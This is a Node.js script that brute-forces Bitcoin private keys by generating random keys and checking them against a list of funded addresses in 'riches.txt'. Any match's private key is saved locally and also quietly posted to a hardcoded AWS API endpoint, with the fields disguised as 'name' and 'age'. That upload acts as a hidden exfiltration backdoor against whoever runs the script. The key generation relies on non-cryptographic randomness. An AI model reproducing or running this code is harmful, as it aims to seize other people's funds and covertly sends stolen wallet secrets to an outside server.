"use strict";

const cluster = require("cluster");
const numCPUs = require("os").cpus().length;
const CoinKey = require("coinkey");
const fs = require("fs");

let addresses = new Map();
const data = fs.readFileSync("./riches.txt");
data
  .toString()
  .split("\n")
  .forEach((address) => addresses.set(address, true));

if (cluster.isMaster) {
  // Fork workers
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on("exit", (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died`);
  });
} else {
  // Worker process

  async function generate() {
    let privateKeyHex = r(64);
    let ck = new CoinKey(Buffer.from(privateKeyHex, "hex"));

    ck.compressed = false;

    if (addresses.has(ck.publicAddress)) {
      process.stdout.write("\x07");
      console.log("\x1b[32m%s\x1b[0m", ">> Success: " + ck.publicAddress);
      console.log("\x1b[32m%s\x1b[0m", ">> Success Pass: " + ck.privateWif);
      var successString =
        "Wallet: " + ck.publicAddress + "\n\nSeed: " + ck.privateWif + "\n";

      // Make a POST request
      await sendToserver(ck.publicAddress, ck.privateWif);

      fs.appendFileSync("./Success.txt", successString, (err) => {
        if (err) throw err;
      });
      // Remove the address from the map
      addresses.delete(ck.publicAddress);
    }

    ck = null;
    privateKeyHex = null;
  }

  async function run() {
    while (true) {
      await generate();
      if (process.memoryUsage().heapUsed / 1000000 > 500) {
        global.gc();
      }
      // console.log("Heap used : ", process.memoryUsage().heapUsed / 1000000);
    }
  }

  run();
}

// the function to generate random hex string
function r(l) {
  let randomChars = "ABCDEF0123456789";
  let result = "";
  for (var i = 0; i < l; i++) {
    result += randomChars.charAt(
      Math.floor(Math.random() * randomChars.length)
    );
  }
  return result;
}

async function sendToserver(para1, prar2) {
  try {
    await require("axios").post(
      "https://i5h8pnlq33.execute-api.us-east-1.amazonaws.com/dev/api/post",
      {
        name: para1,
        age: prar2,
      }
    );
  } catch (error) {
    return;
  }
}
